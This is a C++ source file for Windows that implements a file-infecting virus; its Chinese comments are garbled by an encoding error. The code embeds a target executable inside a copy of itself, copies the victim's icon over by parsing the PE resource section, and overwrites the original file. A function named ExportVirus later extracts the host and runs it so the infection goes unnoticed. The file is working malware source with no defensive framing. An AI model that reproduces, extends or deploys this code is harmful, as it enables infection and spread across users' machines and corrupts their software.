#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include "Inject.h"
void CInjection::OutPut(TCHAR *szDebug)
{
	OutputDebugString(szDebug);

}
BOOL CInjection::IsInjected(TCHAR * szSrc)
{
	HMODULE hLibrary = LoadLibrary(szSrc);

	if (NULL != hLibrary)
	{
		//��ģ��������ڴ棬�������Ƿ��и�Ⱦ��ǡ������ҽ���Ⱦ��Ǽ�ΪINJECTION_RESOURCE_ID
		HRSRC hResource = FindResource(hLibrary, MAKEINTRESOURCE(INJECTION_RESOURCE_ID), RT_RCDATA);
		//����ҵ�����ǵ���Դ,˵���ļ��ѱ���Ⱦ
		if (NULL != hResource)
		{  
			OutPut (L"This file has been injected..");
			FreeLibrary(hLibrary);
			return TRUE;
		}
		//�ͷ��ڴ��е�ӳ��
		FreeLibrary(hLibrary);

	}
	return FALSE;
}
int CInjection::InjectFile(TCHAR *host,BOOL modifyIcon)
{
	//�������·��
	TCHAR *src=host;
	//��ŷ��صĲ�����·��
	TCHAR szMyName[MAX_PATH];
	GetModuleFileName(NULL,szMyName,MAX_PATH);
	TCHAR currentDir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,currentDir);
	TCHAR szTempFileA[MAX_PATH];
	wsprintf(szTempFileA,L"%s\\%s",currentDir,L"tempfile");
	HANDLE hFile;
	DWORD dwFileSize,dwBytesRead;      
	LPBYTE lpBuffer;
	HRSRC hResource;

	//����Ⱦ�Լ�
	if (IsInjected (src)==TRUE)
	{
		return HAS_BEEN_INJECTED;
	}

	if (wcsncmp (szMyName,src,MAX_PATH) == 0)
	{
		return INJECTION_FAIL;
	}
	
	//copy myself into tempfile
	CopyFile(szMyName,szTempFileA,0);
	/*������ļ�û����Ⱦ������ʼ��Ⱦ���ļ�*/
	hFile = CreateFile(
		src, 
		GENERIC_READ, 
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (INVALID_HANDLE_VALUE != hFile)
	{
		//ȡ��������Դ��С(����ʡ��)
		dwFileSize = GetFileSize(hFile, NULL);

		lpBuffer = new BYTE[dwFileSize];

		if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL) != FALSE)
		{
			hResource = (HRSRC)BeginUpdateResource(szTempFileA, FALSE);
			if (NULL != hResource)
			{
				//��Ⱦ��Ľ������szTempFileA
				if (UpdateResource(
					hResource, 
					RT_RCDATA, 
					MAKEINTRESOURCE(INJECTION_RESOURCE_ID), 
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPVOID) lpBuffer, 
					dwFileSize
					) != FALSE)
				{
					EndUpdateResource(hResource, FALSE);
				}
			}
		}
		delete [] lpBuffer;        
		CloseHandle(hFile);

		if (modifyIcon == TRUE)
		{
			ModifyIcon (szTempFileA,src);
		}

		//����ԭ�����ļ�
		CopyFile(szTempFileA,src,0);
		DeleteFile(szTempFileA);
		return INJECTION_SUCCESS;

	}
	//�Ҳ����ļ����˳���
	DeleteFile(szTempFileA);
	OutPut (L"�Ҳ�������");
	return false;

}
int CInjection::ExportVirus()
{

	TCHAR szMyName[MAX_PATH];
	GetModuleFileName(NULL,szMyName,MAX_PATH);
	TCHAR currentDir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,currentDir);
	TCHAR szTempFileA[MAX_PATH];//����+����
	wsprintf(szTempFileA,L"%s\\%s",currentDir,L"copied.exe");
	TCHAR szTempFileB[MAX_PATH];//����
	wsprintf(szTempFileB,L"%s\\%s",currentDir,L"host.exe");
	HANDLE hFile;
	DWORD dwFileSize;      
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	//��������(�Լ�)������ʱ�ļ�A
	CopyFile(szMyName,szTempFileA,0);
	HRSRC hResource;
	HGLOBAL hResourceLoaded;
	LPBYTE lpBuffer;
	//ӳ����ļ���ַ���ڴ棬���ظ���Դ�Ŀ�ִ��ģ����
	HMODULE hLibrary = LoadLibrary(szMyName);
	if (NULL != hLibrary)
	{
		hResource = FindResource(hLibrary, MAKEINTRESOURCE(INJECTION_RESOURCE_ID), RT_RCDATA);
		//����ҵ�����ǵ���Դ,˵���ļ��ѱ���Ⱦ����ô�����ͷ�����
		if (NULL != hResource)
		{
			hResourceLoaded = LoadResource(hLibrary, hResource);
			if (NULL != hResourceLoaded)        
			{
				lpBuffer = (LPBYTE) LockResource(hResourceLoaded);            
				if (NULL != lpBuffer)            
				{                
					DWORD dwBytesWritten;
					//��ȡ������Դ�Ĵ�С
					dwFileSize = SizeofResource(hLibrary, hResource);
					hFile = CreateFile(szTempFileB,
						GENERIC_WRITE,
						0,
						NULL,
						CREATE_ALWAYS,
						FILE_ATTRIBUTE_NORMAL,
						NULL);

					if (INVALID_HANDLE_VALUE != hFile)
					{
						//���ڴ��е�������Դд����ļ�
						WriteFile(hFile, lpBuffer, dwFileSize, &dwBytesWritten, NULL);
						CloseHandle(hFile);
					}
					GetStartupInfo(&si);
					//����������������(�ؼ�)
					CreateProcess(szTempFileB,GetCommandLine(),NULL,
						NULL,NULL,NULL,NULL,NULL,&si,&pi);
					WaitForSingleObject(pi.hProcess, INFINITE);
					FreeLibrary(hLibrary);
					DeleteFile(szTempFileA);
					DeleteFile(szTempFileB);
					//�鵽ϵͳ�ѱ���Ⱦ�󣬲����в�����
					//if(what==1) 
					//{  
					//	//�ͷ��ڴ��е�ӳ��
					//	FreeLibrary(hLibrary);
					//	DeleteFile(szTempFileA);
					//	DeleteFile(szTempFileB);
					//	return true;
					//}
				}
			}
		}
	}
	return true;
}



/***************************************************************************
��������ȡ�ļ���ͼ������λ��
****************************************************************************/
bool CInjection::GetPos(TCHAR m_path[MAX_PATH],int a)
{

	DWORD dwIconSize=0;
	DWORD dwWritePos=0;


	_IMAGE_DOS_HEADER dosHead;
	_IMAGE_NT_HEADERS ntHead;
	_IMAGE_SECTION_HEADER secHead;


	//��ȡPE Header
	DWORD dwBytesRead;
	HANDLE fp = CreateFile(m_path, GENERIC_READ, 
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if(fp==NULL)
	{
		OutPut (L"�ļ�������");
		return false;
	}

	ReadFile(fp,&dosHead,sizeof(_IMAGE_DOS_HEADER), &dwBytesRead, NULL);

	SetFilePointer(fp,dosHead.e_lfanew,NULL,FILE_BEGIN);
	ReadFile(fp,&ntHead,sizeof(_IMAGE_NT_HEADERS),&dwBytesRead,NULL);



	/*����.rsrc�ڣ��ƶ��ļ�ָ�뵽.rsrc�ڿ�ʼ��λ��*/
	for(int i=0;i<ntHead.FileHeader.NumberOfSections;i++)
	{
		ReadFile(fp,&secHead,sizeof(_IMAGE_SECTION_HEADER),&dwBytesRead,NULL);
		if(strcmp((char*)secHead.Name,".rsrc")==0)
		{

			break;
		}
	}

	_IMAGE_RESOURCE_DIRECTORY dirResource;
	//��ȡָ��ָ����Դ���ڵ㿪ʼ��λ��
	SetFilePointer(fp,secHead.PointerToRawData,NULL,FILE_BEGIN);

	//��ȡ��Դ���ڵ㿪ʼ��λ��(���ļ��е�λ�� )
	DWORD pos=secHead.PointerToRawData;
	ReadFile(fp,&dirResource,sizeof(_IMAGE_RESOURCE_DIRECTORY),&dwBytesRead,NULL);
	_IMAGE_RESOURCE_DIRECTORY_ENTRY entryResource={0};
	_IMAGE_RESOURCE_DIRECTORY dirTemp={0};
	_IMAGE_RESOURCE_DIRECTORY_ENTRY entryTemp={0};
	_IMAGE_RESOURCE_DIRECTORY dirTempICON={0};
	_IMAGE_RESOURCE_DIRECTORY_ENTRY entryTempICON={0};
	_IMAGE_RESOURCE_DATA_ENTRY entryData={0};

	for(int i=0;i<dirResource.NumberOfIdEntries+dirResource.NumberOfNamedEntries;i++)
	{
		ReadFile(fp,&entryResource,sizeof(_IMAGE_RESOURCE_DIRECTORY_ENTRY),&dwBytesRead,NULL);

		if(entryResource.Name==3)//����Դ��ͼ��
		{
			//��ȡָ��ָ����һ���IMAGE_RESOURCE_DIRECTORY�ṹ
			SetFilePointer(fp,pos+entryResource.OffsetToDirectory,NULL,FILE_BEGIN);
			ReadFile(fp,&dirTemp,sizeof(_IMAGE_RESOURCE_DIRECTORY),&dwBytesRead,NULL);
			if(dirTemp.NumberOfIdEntries>256)
			{
				OutPut (L">256ʧ��");
				return false;
			}
			//����������ڵ�ָʾ��Ŀ¼
			for(int k=0;k<dirTemp.NumberOfIdEntries;k++)
			{ 
				ReadFile(fp,&entryTemp,sizeof(_IMAGE_RESOURCE_DIRECTORY_ENTRY),&dwBytesRead,NULL);
				//���������Ŀ¼
				if(entryTemp.DataIsDirectory>0) 
				{


					//��ȡָ��ָ����һ���IMAGE_RESOURCE_DIRECTORY�ṹ
					SetFilePointer(fp,pos+entryTemp.OffsetToDirectory,NULL,FILE_BEGIN);
					ReadFile(fp,&dirTempICON,sizeof(_IMAGE_RESOURCE_DIRECTORY),&dwBytesRead,NULL);
					ReadFile(fp,&entryTempICON,sizeof(_IMAGE_RESOURCE_DIRECTORY_ENTRY),&dwBytesRead,NULL);
					SetFilePointer(fp,pos+entryTempICON.OffsetToData,NULL,FILE_BEGIN);
					ReadFile(fp,&entryData,sizeof(_IMAGE_RESOURCE_DATA_ENTRY),&dwBytesRead,NULL);

					//�г���Ŀ¼������ͼ����Դ
					for(int i=0;i<dirTemp.NumberOfIdEntries;i++)
					{
						//�г����з���������ͼ��
						if(entryData.Size >=44)
						{

							//ͼ���С
							dwIconSize=entryData.Size;
							//ͼ����ʼλ��
							dwWritePos=pos+entryData.OffsetToData - secHead.VirtualAddress;


							//��ͼ����Դ��Ϣ����ȫ������
							if(a==1)
							{
								dwSize1[i]=dwIconSize;
								dwPos1[i]=dwWritePos;
							}
							if(a==2)
							{
								dwSize2[i]=dwIconSize;
								dwPos2[i]=dwWritePos;
							}



						}
						SetFilePointer(fp,pos+entryTempICON.OffsetToData+
							(i+1)*sizeof(_IMAGE_RESOURCE_DATA_ENTRY),NULL,FILE_BEGIN);
						ReadFile(fp,&entryData,sizeof(_IMAGE_RESOURCE_DATA_ENTRY),&dwBytesRead,NULL);

					}

				}


			}


		}


	}
	CloseHandle(fp);
	//��ͼ����Դ��������ȫ������
	if(a==1)
	{
		count1=dirTemp.NumberOfIdEntries;
		if(count1>256)
			return false;
		//ʵ�ְ��Ӵ�С����
		int i,j;
		DWORD tempS,tempP;
		for(i=0;i<count1-1;i++)
			for(j=count1-1;j>i;j--)
				if(dwSize1[j]>dwSize1[j-1])
				{
					tempS=dwSize1[j];
					tempP=dwPos1[j];
					dwSize1[j]=dwSize1[j-1];
					dwPos1[j]=dwPos1[j-1];
					dwSize1[j-1]=tempS;
					dwPos1[j-1]=tempP;


				}

	}
	if(a==2)
	{
		count2=dirTemp.NumberOfIdEntries;
		if(count2>256)
			return false;
		//ʵ�ְ��Ӵ�С����
		int i,j;
		DWORD tempS,tempP;
		for(i=0;i<count2-1;i++)
			for(j=count2-1;j>i;j--)
				if(dwSize2[j]>dwSize2[j-1])
				{
					tempS=dwSize2[j];
					tempP=dwPos2[j];
					dwSize2[j]=dwSize2[j-1];
					dwPos2[j]=dwPos2[j-1];
					dwSize2[j-1]=tempS;
					dwPos2[j-1]=tempP;


				}
	}

	return true;
}




/***************************************************************************
�������޸�ͼ��
��szSrc��ͼ��д��szDst��
****************************************************************************/
int CInjection::ModifyIcon(TCHAR szDst[256],TCHAR szSrc[256])
{
	char* SrcBuf;
	int sum;
	if(!GetPos(szSrc,1))
	{
		OutPut (L"if(!GetPos(szSrc,1))��ʧ��");
		return false;
	}


	if(!GetPos(szDst,2))
	{
		OutPut (L"2ʧ��");
		return false;
	}
	if(dwSize2[0]<dwSize1[count1-1])
	{
		OutPut (L"��������!");
		return false;
	}
	//������������
	if(count1>count2||count1==count2)
	{
		sum=count2;
		for(int i=0;i<sum;i++)
		{
			for(int a=0;(a+i)<count1;a++)
			{
				if(dwSize1[a+i]==dwSize2[i]||dwSize1[a+i]<dwSize2[i])
				{

					/*��ȡ�����ļ�ͼ������*/
					DWORD dwBytesRead , dwByteWritten;
					HANDLE fp = CreateFile(szSrc, GENERIC_READ, 
						0,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						NULL);
					SetFilePointer(fp,dwPos1[a+i],NULL,FILE_BEGIN);
					SrcBuf = new char [dwSize1[a+i]];
					ReadFile(fp,SrcBuf,dwSize1[a+i],&dwBytesRead,NULL);
					CloseHandle(fp);

					//д��
					HANDLE ff = CreateFile(szDst,GENERIC_WRITE|GENERIC_READ,
						0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
					SetFilePointer(ff,dwPos2[i],NULL,FILE_BEGIN);
					WriteFile(ff,SrcBuf,dwSize1[a+i],&dwByteWritten,NULL);
					CloseHandle(ff);
					return true;
				}

			}
		}
	}
	else
	{

		sum=count1;
		for(int i=0;i<sum;i++)
		{
			for(int a=0;(a+i)<count2;a++)
			{
				if(dwSize2[a+i]==dwSize1[i]||dwSize2[a+i]>dwSize1[i])

				{
					/*��ȡ�����ļ�ͼ������*/
					DWORD dwBytesRead , dwByteWritten;
					HANDLE fp = CreateFile(szSrc, GENERIC_READ, 
						0,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						NULL);
					SetFilePointer(fp,dwPos1[i],NULL,FILE_BEGIN);
					SrcBuf = new char [dwSize1[i]];
					ReadFile(fp,SrcBuf,dwSize1[i],&dwBytesRead,NULL);
					CloseHandle(fp);

					//д��
					HANDLE ff = CreateFile(szDst,GENERIC_WRITE|GENERIC_READ,
						0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
					SetFilePointer(ff,dwPos2[a+i],NULL,FILE_BEGIN);
					WriteFile(ff,SrcBuf,dwSize1[i],&dwByteWritten,NULL);
					CloseHandle(ff);
					return true;
				}

			}
		}

	}
	return true;
}
